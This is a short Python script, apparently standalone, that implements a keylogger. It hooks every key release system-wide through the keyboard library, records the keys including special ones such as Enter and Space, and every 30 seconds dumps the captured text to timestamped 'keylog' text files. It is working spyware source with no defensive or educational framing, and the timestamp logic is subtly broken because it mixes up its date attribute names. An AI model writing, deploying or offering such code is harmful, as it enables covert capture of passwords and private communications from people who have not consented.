import keyboard 
from threading import Timer
from datetime import datetime

textconvertingtime = 30

class Keylogger:
    def __init__(self, timeperiod):
        
        self.timelimit = timeperiod
        self.txtcontainer = ""
        
        self.startdate = datetime.now() 
        self.enddate = datetime.now()
        
    def callback(self, even):

        name = even.name
        if len(name) > 1:
           
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.txtcontainer += name
    
    def updatefilename(self):
        
        starttime = str(self.startdate)[:-7].replace(" ", "-").replace(":", "")
        endtime = str(self.enddate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{starttime}_{endtime}"

    def reporttofile(self):
        
        
        with open(f"{self.filename}.txt", "w") as f:
            print(self.txtcontainer, file=f)
        print(f"[+] Saved {self.filename}.txt")

  
    def report(self):
        
        if self.txtcontainer: 
            self.end_dt = datetime.now()
            self.updatefilename()
            self.reporttofile() 
            self.start_dt = datetime.now()
        self.txtcontainer = ""
        timer = Timer(interval=self.timelimit, function=self.report)
        timer.s = True
        timer.start()

    def start(self):
        
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
   
    keylogger = Keylogger(timeperiod=textconvertingtime)
    keylogger.start()
